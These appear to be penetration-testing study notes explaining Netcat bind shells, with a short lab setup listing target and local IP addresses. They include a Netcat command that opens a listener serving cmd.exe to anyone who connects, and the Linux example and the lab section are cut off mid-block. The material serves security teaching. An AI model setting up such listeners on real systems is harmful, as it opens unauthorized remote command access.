- Remote Shell
- Allows execution of commands
- Listener is on the target system
- Produces some type of shell when there's a connection


Setup listener that creates a shell upon connection on windows
```
nc -nvlp <port>  -e cmd.exe
```

Setup listener on linux that creates a bin/bash shell upon connection
```

## Lab

In this lab you will learn how to setup a bind shell with Netcat.

A bind shell is a type of remote shell where the attacker connects to a listener on the target system. In order for this to work a listener needs to be running on the target system so that the attacker can connect to it and consequently obtain a remote shell.

This type of shell is not preferred as the attacker directly connects to the target system and in most cases, ingress traffic is always blocked or flagged as suspicious. Nonetheless, it is very important to learn how bind shells work and how they can be setup with Netcat.

```
target ip: 10.4.22.69
local ip: 10.10.22.2
